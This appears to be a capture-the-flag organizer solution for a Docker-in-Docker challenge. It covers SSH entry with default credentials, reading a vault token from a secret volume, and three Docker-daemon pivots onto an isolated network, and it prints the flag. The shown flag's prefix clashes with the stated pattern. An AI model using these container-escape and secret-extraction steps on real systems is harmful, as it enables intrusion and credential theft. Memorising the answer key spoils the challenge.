# X08 — Docker-in-Docker: Organizer Solution & Engineering Guide

## Challenge Overview
* **Challenge ID:** X08
* **Name:** Docker-in-Docker
* **Category:** DinD / Docker Daemon / Nested Containers / Container Lifecycle
* **Difficulty:** Expert / Bonus
* **External Interface:** TCP/22 (SSH)
* **Classification:** `SANDBOX_REQUIRED`

---

## 1. Intended Foothold & SSH Entry
Players connect to the CI runner entrypoint over SSH:
```bash
ssh -p 22 operator@<TARGET_HOST>
# Password: operator
```

---

## 2. Inner Docker Discovery & Enumeration
Inside the CI runner session, the player discovers access to the nested Docker daemon:
```bash
# Check Docker daemon availability
docker info
docker ps -a
docker images
docker network ls
docker volume ls
```

### Observed Environment:
1. **Containers:**
   * `latveria-vault-core`: Target microservice on `vault-internal-net` (IP: `172.28.20.5:8443`).
   * `latveria-api-gateway`: Edge gateway on `ci-frontend-net` (`172.28.10.2:8080`).
   * `ci-pipeline-worker`: CI worker on `ci-frontend-net` (`172.28.10.10`).

2. **Networks:**
   * `ci-frontend-net` (`172.28.10.0/24`)
   * `vault-internal-net` (`172.28.20.0/24` with `--internal` isolation)

3. **Images:**
   * `latveria/vault-core:v2.5-enterprise`
   * `latveria/api-gateway:v1.1`
   * `latveria/ci-agent:v3.2`
   * `latveria/admin-cli:v1.0`

4. **Volumes:**
   * `deploy-secrets-vol`: Contains the secret configuration token for the vault.

---

## 3. Investigating Secrets & Deployment Configurations
Players inspect container logs and mounted volumes to uncover access policies:
```bash
# Read deployment logs from CI worker
docker exec ci-pipeline-worker cat /var/log/pipeline/deploy.log

# Extract Vault access token from secret volume
docker run --rm -v deploy-secrets-vol:/vol alpine cat /vol/vault_access_token.conf
# Outputs: LV-VAULT-TOKEN-9c48e2a1b730f56d
```

---

## 4. Intended Pivot Walkthrough

Because `latveria-vault-core` is isolated on `vault-internal-net`, direct connections from the runner host fail. The player leverages Docker daemon privileges to pivot into the internal network:

```bash
# Method 1: Spin up admin toolkit container on vault-internal-net
docker run --rm --network vault-internal-net latveria/admin-cli:v1.0 \
    curl -s -H "X-Vault-Access-Token: LV-VAULT-TOKEN-9c48e2a1b730f56d" http://latveria-vault-core:8443/api/v1/vault/flag

# Method 2: Connect worker container to vault-internal-net
docker network connect vault-internal-net ci-pipeline-worker
docker exec ci-pipeline-worker curl -s -H "X-Vault-Access-Token: LV-VAULT-TOKEN-9c48e2a1b730f56d" http://172.28.20.5:8443/api/v1/vault/flag

# Method 3: Direct container exec into target
docker exec latveria-vault-core python3 -c '
import urllib.request, json
req = urllib.request.Request("http://127.0.0.1:8443/api/v1/vault/flag", headers={"X-Vault-Access-Token": "LV-VAULT-TOKEN-9c48e2a1b730f56d"})
print(urllib.request.urlopen(req).read().decode())
'
```

---

## 5. Flag Payload & Verification
The vault service responds with the unlocked flag:
```json
{
  "status": "unlocked",
  "flag": "YUVA{d1nd_n3st3d_d0ck3r_d43m0n_p1v0t_x08_7f8e9a2b}",
  "message": "Flag release authorized by Doom Inner Security Protocol.",
  "authorized_client": "172.28.20.x"
}
```

* **Dynamic Flag Generator:** `bash challenge/scripts/generate_flag.sh <team_id>`
* **Flag Pattern:** `DOOM{d1nd_n3st3d_d0ck3r_d43m0n_p1v0t_x08_<hash>}`

---

## 6. Sandbox Isolation & Boundary Rules
* **Dedicated Disposable VM/Sandbox:** 4 vCPU, 4 GiB RAM, ≤8 GiB storage per team.
* **Outer Host Isolation:** Outer `/var/run/docker.sock`, containerd runtime, and host namespaces are never exposed. The player's Docker daemon control terminates at the inner daemon.
* **Network Isolation:** Ingress allowed strictly on TCP/22. Egress blocks `169.254.169.254`, `10.96.0.0/12`, `6443/tcp`, `10250/tcp`, and RFC1918 neighbor subnets.
* **Reset Lifecycle:** Full sandbox destruction and recreation via `challenge/scripts/reset.sh`.
